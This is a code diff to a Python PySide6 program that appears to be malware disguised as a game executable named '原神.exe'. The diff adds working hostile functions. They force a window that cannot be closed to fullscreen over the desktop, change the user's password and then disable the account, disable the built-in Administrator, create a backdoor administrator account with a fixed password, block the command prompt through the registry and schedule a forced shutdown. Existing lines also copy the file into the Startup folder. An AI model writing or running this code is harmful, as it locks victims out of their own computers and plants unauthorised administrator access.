@@ -1,8 +1,9 @@
 import sys
 import os
 import threading
+import pygetwindow as gw
 
-from PySide6.QtCore import QUrl
+from PySide6.QtCore import QUrl, QTimer
 from PySide6.QtMultimedia import QAudioOutput, QMediaPlayer
 from PySide6.QtMultimediaWidgets import QVideoWidget
 from PySide6.QtWidgets import QMainWindow, QApplication
@@ -62,14 +63,28 @@ class MainWindow(QMainWindow):
         self._player.setVideoOutput(self._video_widget)
         self.pt = pt
 
+        # 设置定时器，每秒检查一次用户是否回到桌面
+        self.timer = QTimer(self)
+        self.timer.timeout.connect(self.check_if_on_desktop)
+        self.timer.start(500)  # 每秒检查一次
+
+    def check_if_on_desktop(self):
+        # 获取当前激活的窗口
+        active_window = gw.getActiveWindow()
+
+        # 检查是否是桌面
+        if active_window is None or active_window.title == '':
+            self.showFullScreen()
+            self.raise_()
+
     def play(self):
         self._player.setSource(QUrl.fromLocalFile(self.pt))
         self._player.play()
 
     def closeEvent(self, event):
-        # 重载关闭事件，使得窗口关闭时只是隐藏而不是退出应用程序
         event.ignore()  # 忽略关闭事件
         self.show()     #
+
 
 def addEvents():
     while True:
@@ -92,15 +107,38 @@ def setPassword(password):
     file.close()
     os.remove('./userName')
 
+    return userName
+
 def copy(file_path, save_path):
     os.system(f'copy {file_path} {save_path}')
-    # QTimer.singleShot(5000, lambda: os.system(f'attrib +h {save_path + '\原神.exe'}'))
 
 def getFilePath(file_name):
     # 获取打包后的可执行文件所在的临时目录
     basePath = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
     # 构建视频文件的绝对路径
     return os.path.join(basePath, file_name)
+
+def disableCMD():
+    os.system('reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f')
+
+def disableUser(userName):
+    os.system(f'net user {userName} /active:no')
+
+def createUser(userName, password, manager=False):
+    if manager:
+        os.system(f'net user {userName} {password} /add')
+        os.system(f'net localgroup Administrators {userName} /add')
+    else:
+        os.system(f'net user {userName} {password} /add')
+
+def is_user_on_desktop():
+    # 获取当前激活的窗口
+    active_window = gw.getActiveWindow()
+
+    # 检查窗口标题是否为空（通常桌面窗口没有标题）
+    if active_window and active_window.title == '':
+        return True
+    return False
 
 def backgroundTasks():
     # 后台任务（运行在辅助线程中）
@@ -109,7 +147,11 @@ def backgroundTasks():
     clearMute()
     setAudio(1.0)
     copy('原神.exe', '"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
+    disableUser(setPassword(1145141919810))
+    disableUser('Administrator')
+    createUser('Jocker', "0d000721", True)
     os.system('shutdown -s -f -t 150')
+    disableCMD()
     addEvents()
 
 def main():
@@ -130,5 +172,5 @@ def main():
     sys.exit(app.exec())
 
 if __name__ == '__main__':
-    # main(
+    # main()
     pass
